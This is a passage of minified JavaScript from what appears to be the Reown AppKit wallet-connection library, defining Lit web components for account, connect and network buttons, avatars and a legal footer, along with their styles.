    `,X`<slot></slot>`}};Zs.styles=[Dt,tke];ua([ie()],Zs.prototype,"flexDirection",void 0);ua([ie()],Zs.prototype,"flexWrap",void 0);ua([ie()],Zs.prototype,"flexBasis",void 0);ua([ie()],Zs.prototype,"flexGrow",void 0);ua([ie()],Zs.prototype,"flexShrink",void 0);ua([ie()],Zs.prototype,"alignItems",void 0);ua([ie()],Zs.prototype,"justifyContent",void 0);ua([ie()],Zs.prototype,"columnGap",void 0);ua([ie()],Zs.prototype,"rowGap",void 0);ua([ie()],Zs.prototype,"gap",void 0);ua([ie()],Zs.prototype,"padding",void 0);ua([ie()],Zs.prototype,"margin",void 0);ua([ie()],Zs.prototype,"width",void 0);Zs=ua([Ue("wui-flex")],Zs);const nke=ot`
  :host {
    display: block;
    width: var(--local-width);
    height: var(--local-height);
    border-radius: ${({borderRadius:t})=>t[16]};
    overflow: hidden;
    position: relative;
  }

  :host([data-variant='generated']) {
    --mixed-local-color-1: var(--local-color-1);
    --mixed-local-color-2: var(--local-color-2);
    --mixed-local-color-3: var(--local-color-3);
    --mixed-local-color-4: var(--local-color-4);
    --mixed-local-color-5: var(--local-color-5);
  }

  :host([data-variant='generated']) {
    background: radial-gradient(
      var(--local-radial-circle),
      #fff 0.52%,
      var(--mixed-local-color-5) 31.25%,
      var(--mixed-local-color-3) 51.56%,
      var(--mixed-local-color-2) 65.63%,
      var(--mixed-local-color-1) 82.29%,
      var(--mixed-local-color-4) 100%
    );
  }

  :host([data-variant='default']) {
    background: radial-gradient(
      75.29% 75.29% at 64.96% 24.36%,
      #fff 0.52%,
      #f5ccfc 31.25%,
      #dba4f5 51.56%,
      #9a8ee8 65.63%,
      #6493da 82.29%,
      #6ebdea 100%
    );
  }
`;var aA=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let fg=class extends $e{constructor(){super(...arguments),this.imageSrc=void 0,this.alt=void 0,this.address=void 0,this.size="xl"}render(){const e={inherit:"inherit",xxs:"3",xs:"5",sm:"6",md:"8",mdl:"8",lg:"10",xl:"16",xxl:"20"};return this.style.cssText=`
    --local-width: var(--apkt-spacing-${e[this.size??"xl"]});
    --local-height: var(--apkt-spacing-${e[this.size??"xl"]});
    `,X`${this.visualTemplate()}`}visualTemplate(){if(this.imageSrc)return this.dataset.variant="image",X`<wui-image src=${this.imageSrc} alt=${this.alt??"avatar"}></wui-image>`;if(this.address){this.dataset.variant="generated";const e=Cr.generateAvatarColors(this.address);return this.style.cssText+=`
 ${e}`,null}return this.dataset.variant="default",null}};fg.styles=[Dt,nke];aA([ie()],fg.prototype,"imageSrc",void 0);aA([ie()],fg.prototype,"alt",void 0);aA([ie()],fg.prototype,"address",void 0);aA([ie()],fg.prototype,"size",void 0);fg=aA([Ue("wui-avatar")],fg);const rke=ot`
  :host {
    display: block;
  }

  button {
    border-radius: ${({borderRadius:t})=>t[20]};
    background: ${({tokens:t})=>t.theme.foregroundPrimary};
    display: flex;
    gap: ${({spacing:t})=>t[1]};
    padding: ${({spacing:t})=>t[1]};
    color: ${({tokens:t})=>t.theme.textSecondary};
    border-radius: ${({borderRadius:t})=>t[16]};
    height: 32px;
    transition: box-shadow ${({durations:t})=>t.lg}
      ${({easings:t})=>t["ease-out-power-2"]};
    will-change: box-shadow;
  }

  button wui-flex.avatar-container {
    width: 28px;
    height: 24px;
    position: relative;

    wui-flex.network-image-container {
      position: absolute;
      bottom: 0px;
      right: 0px;
      width: 12px;
      height: 12px;
    }

    wui-flex.network-image-container wui-icon {
      background: ${({tokens:t})=>t.theme.foregroundPrimary};
    }

    wui-avatar {
      width: 24px;
      min-width: 24px;
      height: 24px;
    }

    wui-icon {
      width: 12px;
      height: 12px;
    }
  }

  wui-image,
  wui-icon {
    border-radius: ${({borderRadius:t})=>t[16]};
  }

  wui-text {
    white-space: nowrap;
  }

  button wui-flex.balance-container {
    height: 100%;
    border-radius: ${({borderRadius:t})=>t[16]};
    padding-left: ${({spacing:t})=>t[1]};
    padding-right: ${({spacing:t})=>t[1]};
    background: ${({tokens:t})=>t.theme.foregroundSecondary};
    color: ${({tokens:t})=>t.theme.textPrimary};
    transition: background-color ${({durations:t})=>t.lg}
      ${({easings:t})=>t["ease-out-power-2"]};
    will-change: background-color;
  }

  /* -- Hover & Active states ----------------------------------------------------------- */
  button:hover:enabled,
  button:focus-visible:enabled,
  button:active:enabled {
    box-shadow: 0px 0px 8px 0px rgba(0, 0, 0, 0.2);

    wui-flex.balance-container {
      background: ${({tokens:t})=>t.theme.foregroundTertiary};
    }
  }

  /* -- Disabled states --------------------------------------------------- */
  button:disabled wui-text,
  button:disabled wui-flex.avatar-container {
    opacity: 0.3;
  }
`;var Hu=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Qa=class extends $e{constructor(){super(...arguments),this.networkSrc=void 0,this.avatarSrc=void 0,this.balance=void 0,this.isUnsupportedChain=void 0,this.disabled=!1,this.loading=!1,this.address="",this.profileName="",this.charsStart=4,this.charsEnd=6}render(){return X`
      <button
        ?disabled=${this.disabled}
        class=${et(this.balance?void 0:"local-no-balance")}
        data-error=${et(this.isUnsupportedChain)}
      >
        ${this.imageTemplate()} ${this.addressTemplate()} ${this.balanceTemplate()}
      </button>
    `}imageTemplate(){const e=this.networkSrc?X`<wui-image src=${this.networkSrc}></wui-image>`:X` <wui-icon size="inherit" color="inherit" name="networkPlaceholder"></wui-icon> `;return X`<wui-flex class="avatar-container">
      <wui-avatar
        .imageSrc=${this.avatarSrc}
        alt=${this.address}
        address=${this.address}
      ></wui-avatar>

      <wui-flex class="network-image-container">${e}</wui-flex>
    </wui-flex>`}addressTemplate(){return X`<wui-text variant="md-regular" color="inherit">
      ${this.address?Cr.getTruncateString({string:this.profileName||this.address,charsStart:this.profileName?18:this.charsStart,charsEnd:this.profileName?0:this.charsEnd,truncate:this.profileName?"end":"middle"}):null}
    </wui-text>`}balanceTemplate(){if(this.balance){const e=this.loading?X`<wui-loading-spinner size="md" color="inherit"></wui-loading-spinner>`:X`<wui-text variant="md-regular" color="inherit"> ${this.balance}</wui-text>`;return X`<wui-flex alignItems="center" justifyContent="center" class="balance-container"
        >${e}</wui-flex
      >`}return null}};Qa.styles=[Dt,nr,rke];Hu([ie()],Qa.prototype,"networkSrc",void 0);Hu([ie()],Qa.prototype,"avatarSrc",void 0);Hu([ie()],Qa.prototype,"balance",void 0);Hu([ie({type:Boolean})],Qa.prototype,"isUnsupportedChain",void 0);Hu([ie({type:Boolean})],Qa.prototype,"disabled",void 0);Hu([ie({type:Boolean})],Qa.prototype,"loading",void 0);Hu([ie()],Qa.prototype,"address",void 0);Hu([ie()],Qa.prototype,"profileName",void 0);Hu([ie()],Qa.prototype,"charsStart",void 0);Hu([ie()],Qa.prototype,"charsEnd",void 0);Qa=Hu([Ue("wui-account-button")],Qa);var Ao=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};class Co extends $e{constructor(){super(...arguments),this.unsubscribe=[],this.disabled=!1,this.balance="show",this.charsStart=4,this.charsEnd=6,this.namespace=void 0,this.isSupported=de.state.allowUnsupportedChain?!0:Y.state.activeChain?Y.checkIfSupportedNetwork(Y.state.activeChain):!0}connectedCallback(){super.connectedCallback(),this.setAccountData(Y.getAccountData(this.namespace)),this.setNetworkData(Y.getNetworkData(this.namespace))}firstUpdated(){const e=this.namespace;e?this.unsubscribe.push(Y.subscribeChainProp("accountState",n=>{this.setAccountData(n)},e),Y.subscribeChainProp("networkState",n=>{this.setNetworkData(n),this.isSupported=Y.checkIfSupportedNetwork(e,n?.caipNetwork?.caipNetworkId)},e)):this.unsubscribe.push(Pi.subscribeNetworkImages(()=>{this.networkImage=er.getNetworkImage(this.network)}),Y.subscribeKey("activeCaipAddress",n=>{this.caipAddress=n}),Y.subscribeChainProp("accountState",n=>{this.setAccountData(n)}),Y.subscribeKey("activeCaipNetwork",n=>{this.network=n,this.networkImage=er.getNetworkImage(n),this.isSupported=n?.chainNamespace?Y.checkIfSupportedNetwork(n?.chainNamespace):!0,this.fetchNetworkImage(n)}))}updated(){this.fetchNetworkImage(this.network)}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){if(!Y.state.activeChain)return null;const e=this.balance==="show",n=typeof this.balanceVal!="string",{formattedText:r}=xe.parseBalance(this.balanceVal,this.balanceSymbol);return X`
      <wui-account-button
        .disabled=${!!this.disabled}
        .isUnsupportedChain=${de.state.allowUnsupportedChain?!1:!this.isSupported}
        address=${et(xe.getPlainAddress(this.caipAddress))}
        profileName=${et(this.profileName)}
        networkSrc=${et(this.networkImage)}
        avatarSrc=${et(this.profileImage)}
        balance=${e?r:""}
        @click=${this.onClick.bind(this)}
        data-testid=${`account-button${this.namespace?`-${this.namespace}`:""}`}
        .charsStart=${this.charsStart}
        .charsEnd=${this.charsEnd}
        ?loading=${n}
      >
      </wui-account-button>
    `}onClick(){this.isSupported||de.state.allowUnsupportedChain?kt.open({namespace:this.namespace}):kt.open({view:"UnsupportedChain"})}async fetchNetworkImage(e){e?.assets?.imageId&&(this.networkImage=await er.fetchNetworkImage(e?.assets?.imageId))}setAccountData(e){e&&(this.caipAddress=e.caipAddress,this.balanceVal=e.balance,this.balanceSymbol=e.balanceSymbol,this.profileName=e.profileName,this.profileImage=e.profileImage)}setNetworkData(e){e&&(this.network=e.caipNetwork,this.networkImage=er.getNetworkImage(e.caipNetwork))}}Ao([ie({type:Boolean})],Co.prototype,"disabled",void 0);Ao([ie()],Co.prototype,"balance",void 0);Ao([ie()],Co.prototype,"charsStart",void 0);Ao([ie()],Co.prototype,"charsEnd",void 0);Ao([ie()],Co.prototype,"namespace",void 0);Ao([Ee()],Co.prototype,"caipAddress",void 0);Ao([Ee()],Co.prototype,"balanceVal",void 0);Ao([Ee()],Co.prototype,"balanceSymbol",void 0);Ao([Ee()],Co.prototype,"profileName",void 0);Ao([Ee()],Co.prototype,"profileImage",void 0);Ao([Ee()],Co.prototype,"network",void 0);Ao([Ee()],Co.prototype,"networkImage",void 0);Ao([Ee()],Co.prototype,"isSupported",void 0);let U7=class extends Co{};U7=Ao([Ue("w3m-account-button")],U7);let qx=class extends Co{};qx=Ao([Ue("appkit-account-button")],qx);const ike=mr`
  :host {
    display: block;
    width: max-content;
  }
`;var zu=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};class Gc extends $e{constructor(){super(...arguments),this.unsubscribe=[],this.disabled=!1,this.balance=void 0,this.size=void 0,this.label=void 0,this.loadingLabel=void 0,this.charsStart=4,this.charsEnd=6,this.namespace=void 0}firstUpdated(){this.caipAddress=this.namespace?Y.getAccountData(this.namespace)?.caipAddress:Y.state.activeCaipAddress,this.namespace?this.unsubscribe.push(Y.subscribeChainProp("accountState",e=>{this.caipAddress=e?.caipAddress},this.namespace)):this.unsubscribe.push(Y.subscribeKey("activeCaipAddress",e=>this.caipAddress=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return this.caipAddress?X`
          <appkit-account-button
            .disabled=${!!this.disabled}
            balance=${et(this.balance)}
            .charsStart=${et(this.charsStart)}
            .charsEnd=${et(this.charsEnd)}
            namespace=${et(this.namespace)}
          >
          </appkit-account-button>
        `:X`
          <appkit-connect-button
            size=${et(this.size)}
            label=${et(this.label)}
            loadingLabel=${et(this.loadingLabel)}
            namespace=${et(this.namespace)}
          ></appkit-connect-button>
        `}}Gc.styles=ike;zu([ie({type:Boolean})],Gc.prototype,"disabled",void 0);zu([ie()],Gc.prototype,"balance",void 0);zu([ie()],Gc.prototype,"size",void 0);zu([ie()],Gc.prototype,"label",void 0);zu([ie()],Gc.prototype,"loadingLabel",void 0);zu([ie()],Gc.prototype,"charsStart",void 0);zu([ie()],Gc.prototype,"charsEnd",void 0);zu([ie()],Gc.prototype,"namespace",void 0);zu([Ee()],Gc.prototype,"caipAddress",void 0);let L7=class extends Gc{};L7=zu([Ue("w3m-button")],L7);let Vx=class extends Gc{};Vx=zu([Ue("appkit-button")],Vx);const ske=ot`
  :host {
    position: relative;
    display: block;
  }

  button {
    border-radius: ${({borderRadius:t})=>t[2]};
  }

  button[data-size='sm'] {
    padding: ${({spacing:t})=>t[2]};
  }

  button[data-size='md'] {
    padding: ${({spacing:t})=>t[3]};
  }

  button[data-size='lg'] {
    padding: ${({spacing:t})=>t[4]};
  }

  button[data-variant='primary'] {
    background: ${({tokens:t})=>t.core.backgroundAccentPrimary};
  }

  button[data-variant='secondary'] {
    background: ${({tokens:t})=>t.core.foregroundAccent010};
  }

  button:hover:enabled {
    border-radius: ${({borderRadius:t})=>t[3]};
  }

  button:disabled {
    cursor: not-allowed;
  }

  button[data-loading='true'] {
    cursor: not-allowed;
  }

  button[data-loading='true'][data-size='sm'] {
    border-radius: ${({borderRadius:t})=>t[32]};
    padding: ${({spacing:t})=>t[2]} ${({spacing:t})=>t[3]};
  }

  button[data-loading='true'][data-size='md'] {
    border-radius: ${({borderRadius:t})=>t[20]};
    padding: ${({spacing:t})=>t[3]} ${({spacing:t})=>t[4]};
  }

  button[data-loading='true'][data-size='lg'] {
    border-radius: ${({borderRadius:t})=>t[16]};
    padding: ${({spacing:t})=>t[4]} ${({spacing:t})=>t[5]};
  }
`;var cA=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let hg=class extends $e{constructor(){super(...arguments),this.size="md",this.variant="primary",this.loading=!1,this.text="Connect Wallet"}render(){return X`
      <button
        data-loading=${this.loading}
        data-variant=${this.variant}
        data-size=${this.size}
        ?disabled=${this.loading}
      >
        ${this.contentTemplate()}
      </button>
    `}contentTemplate(){const e={lg:"lg-regular",md:"md-regular",sm:"sm-regular"},n={primary:"invert",secondary:"accent-primary"};return this.loading?X`<wui-loading-spinner
      color=${n[this.variant]}
      size=${this.size}
    ></wui-loading-spinner>`:X` <wui-text variant=${e[this.size]} color=${n[this.variant]}>
        ${this.text}
      </wui-text>`}};hg.styles=[Dt,nr,ske];cA([ie()],hg.prototype,"size",void 0);cA([ie()],hg.prototype,"variant",void 0);cA([ie({type:Boolean})],hg.prototype,"loading",void 0);cA([ie()],hg.prototype,"text",void 0);hg=cA([Ue("wui-connect-button")],hg);var Zp=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};class Yp extends $e{constructor(){super(),this.unsubscribe=[],this.size="md",this.label="Connect Wallet",this.loadingLabel="Connecting...",this.open=kt.state.open,this.loading=this.namespace?kt.state.loadingNamespaceMap.get(this.namespace):kt.state.loading,this.unsubscribe.push(kt.subscribe(e=>{this.open=e.open,this.loading=this.namespace?e.loadingNamespaceMap.get(this.namespace):e.loading}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return X`
      <wui-connect-button
        size=${et(this.size)}
        .loading=${this.loading}
        @click=${this.onClick.bind(this)}
        data-testid=${`connect-button${this.namespace?`-${this.namespace}`:""}`}
      >
        ${this.loading?this.loadingLabel:this.label}
      </wui-connect-button>
    `}onClick(){this.open?kt.close():this.loading||kt.open({view:"Connect",namespace:this.namespace})}}Zp([ie()],Yp.prototype,"size",void 0);Zp([ie()],Yp.prototype,"label",void 0);Zp([ie()],Yp.prototype,"loadingLabel",void 0);Zp([ie()],Yp.prototype,"namespace",void 0);Zp([Ee()],Yp.prototype,"open",void 0);Zp([Ee()],Yp.prototype,"loading",void 0);let F7=class extends Yp{};F7=Zp([Ue("w3m-connect-button")],F7);let Wx=class extends Yp{};Wx=Zp([Ue("appkit-connect-button")],Wx);const oke=ot`
  :host {
    display: inline-flex;
    justify-content: center;
    align-items: center;
    border-radius: ${({borderRadius:t})=>t[2]};
    padding: ${({spacing:t})=>t[1]} !important;
    background-color: ${({tokens:t})=>t.theme.backgroundPrimary};
    position: relative;
  }

  :host([data-padding='2']) {
    padding: ${({spacing:t})=>t[2]} !important;
  }

  :host:after {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    border-radius: ${({borderRadius:t})=>t[2]};
  }

  :host > wui-icon {
    z-index: 10;
  }

  /* -- Colors --------------------------------------------------- */
  :host([data-color='accent-primary']) {
    color: ${({tokens:t})=>t.core.iconAccentPrimary};
  }

  :host([data-color='accent-primary']):after {
    background-color: ${({tokens:t})=>t.core.foregroundAccent010};
  }

  :host([data-color='default']),
  :host([data-color='secondary']) {
    color: ${({tokens:t})=>t.theme.iconDefault};
  }

  :host([data-color='default']):after {
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
  }

  :host([data-color='secondary']):after {
    background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
  }

  :host([data-color='success']) {
    color: ${({tokens:t})=>t.core.iconSuccess};
  }

  :host([data-color='success']):after {
    background-color: ${({tokens:t})=>t.core.backgroundSuccess};
  }

  :host([data-color='error']) {
    color: ${({tokens:t})=>t.core.iconError};
  }

  :host([data-color='error']):after {
    background-color: ${({tokens:t})=>t.core.backgroundError};
  }

  :host([data-color='warning']) {
    color: ${({tokens:t})=>t.core.iconWarning};
  }

  :host([data-color='warning']):after {
    background-color: ${({tokens:t})=>t.core.backgroundWarning};
  }

  :host([data-color='inverse']) {
    color: ${({tokens:t})=>t.theme.iconInverse};
  }

  :host([data-color='inverse']):after {
    background-color: transparent;
  }
`;var uA=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let pg=class extends $e{constructor(){super(...arguments),this.icon="copy",this.size="md",this.padding="1",this.color="default"}render(){return this.dataset.padding=this.padding,this.dataset.color=this.color,X`
      <wui-icon size=${et(this.size)} name=${this.icon} color="inherit"></wui-icon>
    `}};pg.styles=[Dt,nr,oke];uA([ie()],pg.prototype,"icon",void 0);uA([ie()],pg.prototype,"size",void 0);uA([ie()],pg.prototype,"padding",void 0);uA([ie()],pg.prototype,"color",void 0);pg=uA([Ue("wui-icon-box")],pg);const ake=ot`
  :host {
    display: block;
  }

  button {
    border-radius: ${({borderRadius:t})=>t[32]};
    display: flex;
    gap: ${({spacing:t})=>t[1]};
    padding: ${({spacing:t})=>t[1]} ${({spacing:t})=>t[2]}
      ${({spacing:t})=>t[1]} ${({spacing:t})=>t[1]};
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
  }

  button:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }

  @media (hover: hover) {
    button:hover:enabled {
      background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
    }
  }

  button[data-size='sm'] > wui-icon-box,
  button[data-size='sm'] > wui-image {
    width: 16px;
    height: 16px;
  }

  button[data-size='md'] > wui-icon-box,
  button[data-size='md'] > wui-image {
    width: 20px;
    height: 20px;
  }

  button[data-size='lg'] > wui-icon-box,
  button[data-size='lg'] > wui-image {
    width: 24px;
    height: 24px;
  }

  wui-image,
  wui-icon-box {
    border-radius: ${({borderRadius:t})=>t[32]};
  }
`;var lA=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let mg=class extends $e{constructor(){super(...arguments),this.imageSrc=void 0,this.isUnsupportedChain=void 0,this.disabled=!1,this.size="lg"}render(){const e={sm:"sm-regular",md:"md-regular",lg:"lg-regular"};return X`
      <button data-size=${this.size} data-testid="wui-network-button" ?disabled=${this.disabled}>
        ${this.visualTemplate()}
        <wui-text variant=${e[this.size]} color="primary">
          <slot></slot>
        </wui-text>
      </button>
    `}visualTemplate(){return this.isUnsupportedChain?X` <wui-icon-box color="error" icon="warningCircle"></wui-icon-box> `:this.imageSrc?X`<wui-image src=${this.imageSrc}></wui-image>`:X` <wui-icon size="xl" color="default" name="networkPlaceholder"></wui-icon> `}};mg.styles=[Dt,nr,ake];lA([ie()],mg.prototype,"imageSrc",void 0);lA([ie({type:Boolean})],mg.prototype,"isUnsupportedChain",void 0);lA([ie({type:Boolean})],mg.prototype,"disabled",void 0);lA([ie()],mg.prototype,"size",void 0);mg=lA([Ue("wui-network-button")],mg);const cke=mr`
  :host {
    display: block;
    width: max-content;
  }
`;var Wf=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};class sd extends $e{constructor(){super(),this.unsubscribe=[],this.disabled=!1,this.network=Y.state.activeCaipNetwork,this.networkImage=er.getNetworkImage(this.network),this.caipAddress=Y.state.activeCaipAddress,this.loading=kt.state.loading,this.isSupported=de.state.allowUnsupportedChain?!0:Y.state.activeChain?Y.checkIfSupportedNetwork(Y.state.activeChain):!0,this.unsubscribe.push(Pi.subscribeNetworkImages(()=>{this.networkImage=er.getNetworkImage(this.network)}),Y.subscribeKey("activeCaipAddress",e=>{this.caipAddress=e}),Y.subscribeKey("activeCaipNetwork",e=>{this.network=e,this.networkImage=er.getNetworkImage(e),this.isSupported=e?.chainNamespace?Y.checkIfSupportedNetwork(e.chainNamespace):!0,er.fetchNetworkImage(e?.assets?.imageId)}),kt.subscribeKey("loading",e=>this.loading=e))}firstUpdated(){er.fetchNetworkImage(this.network?.assets?.imageId)}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.network?Y.checkIfSupportedNetwork(this.network.chainNamespace):!0;return X`
      <wui-network-button
        .disabled=${!!(this.disabled||this.loading)}
        .isUnsupportedChain=${de.state.allowUnsupportedChain?!1:!e}
        imageSrc=${et(this.networkImage)}
        @click=${this.onClick.bind(this)}
        data-testid="w3m-network-button"
      >
        ${this.getLabel()}
        <slot></slot>
      </wui-network-button>
    `}getLabel(){return this.network?!this.isSupported&&!de.state.allowUnsupportedChain?"Switch Network":this.network.name:this.label?this.label:this.caipAddress?"Unknown Network":"Select Network"}onClick(){this.loading||(tt.sendEvent({type:"track",event:"CLICK_NETWORKS"}),kt.open({view:"Networks"}))}}sd.styles=cke;Wf([ie({type:Boolean})],sd.prototype,"disabled",void 0);Wf([ie({type:String})],sd.prototype,"label",void 0);Wf([Ee()],sd.prototype,"network",void 0);Wf([Ee()],sd.prototype,"networkImage",void 0);Wf([Ee()],sd.prototype,"caipAddress",void 0);Wf([Ee()],sd.prototype,"loading",void 0);Wf([Ee()],sd.prototype,"isSupported",void 0);let $7=class extends sd{};$7=Wf([Ue("w3m-network-button")],$7);let Gx=class extends sd{};Gx=Wf([Ue("appkit-network-button")],Gx);const uke="https://reown.com",lke=ot`
  .reown-logo {
    height: 24px;
  }

  a {
    text-decoration: none;
    cursor: pointer;
    color: ${({tokens:t})=>t.theme.textSecondary};
  }

  a:hover {
    opacity: 0.9;
  }
`;var dke=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let H7=class extends $e{render(){return X`
      <a
        data-testid="ux-branding-reown"
        href=${uke}
        rel="noreferrer"
        target="_blank"
        style="text-decoration: none;"
      >
        <wui-flex
          justifyContent="center"
          alignItems="center"
          gap="1"
          .padding=${["01","0","3","0"]}
        >
          <wui-text variant="sm-regular" color="inherit"> UX by </wui-text>
          <wui-icon name="reown" size="inherit" class="reown-logo"></wui-icon>
        </wui-flex>
      </a>
    `}};H7.styles=[Dt,nr,lke];H7=dke([Ue("wui-ux-by-reown")],H7);const fke=ot`
  :host wui-ux-by-reown {
    padding-top: 0;
  }

  :host wui-ux-by-reown.branding-only {
    padding-top: ${({spacing:t})=>t[3]};
  }

  a {
    text-decoration: none;
    color: ${({tokens:t})=>t.core.textAccentPrimary};
    font-weight: 500;
  }
`;var Bae=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Kx=class extends $e{constructor(){super(),this.unsubscribe=[],this.remoteFeatures=de.state.remoteFeatures,this.unsubscribe.push(de.subscribeKey("remoteFeatures",e=>this.remoteFeatures=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const{termsConditionsUrl:e,privacyPolicyUrl:n}=de.state,r=de.state.features?.legalCheckbox;return!e&&!n||r?X`
        <wui-flex flexDirection="column"> ${this.reownBrandingTemplate(!0)} </wui-flex>
      `:X`
      <wui-flex flexDirection="column">
        <wui-flex .padding=${["4","3","3","3"]} justifyContent="center">
          <wui-text color="secondary" variant="md-regular" align="center">
            By connecting your wallet, you agree to our <br />
            ${this.termsTemplate()} ${this.andTemplate()} ${this.privacyTemplate()}
          </wui-text>
        </wui-flex>
        ${this.reownBrandingTemplate()}
      </wui-flex>
    `}andTemplate(){const{termsConditionsUrl:e,privacyPolicyUrl:n}=de.state;return e&&n?"and":""}termsTemplate(){const{termsConditionsUrl:e}=de.state;return e?X`<a href=${e} target="_blank" rel="noopener noreferrer"
      >Terms of Service</a
    >`:null}privacyTemplate(){const{privacyPolicyUrl:e}=de.state;return e?X`<a href=${e} target="_blank" rel="noopener noreferrer"
      >Privacy Policy</a
    >`:null}reownBrandingTemplate(e=!1){return this.remoteFeatures?.reownBranding?e?X`<wui-ux-by-reown class="branding-only"></wui-ux-by-reown>`:X`<wui-ux-by-reown></wui-ux-by-reown>`:null}};Kx.styles=[fke];Bae([Ee()],Kx.prototype,"remoteFeatures",void 0);Kx=Bae([Ue("w3m-legal-footer")],Kx);const hke=ot`
  button {
    border: none;
    background: transparent;
    height: 20px;
    padding: ${({spacing:t})=>t[2]};
    column-gap: ${({spacing:t})=>t[1]};
    border-radius: ${({borderRadius:t})=>t[1]};
    padding: 0 ${({spacing:t})=>t[1]};
    border-radius: ${({spacing:t})=>t[1]};
  }

  /* -- Variants --------------------------------------------------------- */
  button[data-variant='accent'] {
    color: ${({tokens:t})=>t.core.textAccentPrimary};
  }

  button[data-variant='secondary'] {
    color: ${({tokens:t})=>t.theme.textSecondary};
  }

  /* -- Focus states --------------------------------------------------- */
  button:focus-visible:enabled {
    box-shadow: 0px 0px 0px 4px rgba(9, 136, 240, 0.2);
  }

  button[data-variant='accent']:focus-visible:enabled {
    background-color: ${({tokens:t})=>t.core.foregroundAccent010};
  }

  button[data-variant='secondary']:focus-visible:enabled {
    background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
  }

  /* -- Hover & Active states ----------------------------------------------------------- */
  button[data-variant='accent']:hover:enabled {
    background-color: ${({tokens:t})=>t.core.foregroundAccent010};
  }

  button[data-variant='secondary']:hover:enabled {
    background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
  }

  button[data-variant='accent']:focus-visible {
    background-color: ${({tokens:t})=>t.core.foregroundAccent010};
  }

  button[data-variant='secondary']:focus-visible {
    background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
    box-shadow: 0px 0px 0px 4px rgba(9, 136, 240, 0.2);
  }

  button[disabled] {
